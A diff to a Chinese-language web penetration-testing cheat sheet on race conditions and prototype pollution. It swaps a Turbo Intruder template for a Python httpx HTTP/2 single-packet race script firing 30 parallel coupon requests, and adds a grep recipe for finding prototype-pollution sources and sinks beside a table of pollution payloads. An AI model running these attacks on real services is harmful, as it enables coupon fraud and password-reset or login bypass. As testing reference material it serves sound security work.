@@ -17,23 +17,20 @@
 - **密码重置接管**: 同时用两个 token 触发重置
 - **partial-construction（部分构造）**: 对象分多步创建（如注册先建 user 行再单独写 password），中间态未初始化。用能匹配未初始化值的输入（JSON `null` / PHP 空数组）命中中间态 → 密码重置/登录绕过
 
-### 操作步骤（Turbo Intruder）
-```python
-# Turbo Intruder 脚本: single-packet-attack.py 模板
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           engine=Engine.BURP2,  # HTTP/2
-                           concurrentConnections=1,
-                           requestsPerCurrentConnection=30)
-    # 预发所有请求（不发最后一字节）
-    for i in range(30):
-        engine.queue(target.req, i, pauseMarker=len(b'body')-1)
-    # 一次性发出所有保留帧
-    engine.startOpenTimer()
-    engine.completeRequests()
-```
+### 操作步骤（HTTP/2 单包攻击脚本）
 
-或用 **Burp Repeater "Send group in parallel"**（2024+ 内置）。
+原理: 所有请求的 HTTP/2 帧在同一 TCP 分组内到达，绕过服务端竞态窗口。python 模板（httpx h2 单连接多流并发）:
+```python
+import httpx, asyncio
+async def one(c, i):
+    return await c.post(URL, json={"coupon": f"C{i}", "user": UID})
+async def main():
+    async with httpx.AsyncClient(http2=True) as c:  # 单连接多流=帧聚合
+        rs = await asyncio.gather(*[one(c, i) for i in range(30)])
+        [print(r.status_code, r.text[:60]) for r in rs]
+asyncio.run(main())
+```
+HTTP/1.1 目标退而求其次: 多连接同毫秒并发（线程池 simultaneously 发出）或单连接 keep-alive 流水线连续写。
 
 ### 方法论
 1. 预测潜在碰撞对象（哪些操作共享状态）
@@ -67,7 +64,7 @@ __proto__ → constructor.prototype（绕 __proto__ 黑名单）
 | Charset Override | `__proto__[charset]=UTF-7` | 响应 charset 变化 |
 
 ### Client-side 检测
-用 **DOM Invader**（Burp 内置）自动找 PP 源和 gadget。
+PP 源与 gadget 静态挖掘: 全部 JS `grep -nE "location\.(hash|search|href)|window\.name|\.message" *.js` 找源，再追赋值链到 sink（innerHTML/src/eval）——源到 sink 无净化即候选。
 
 ### 常见 Gadgets 速查
 | Gadget | 库/场景 | 利用 |
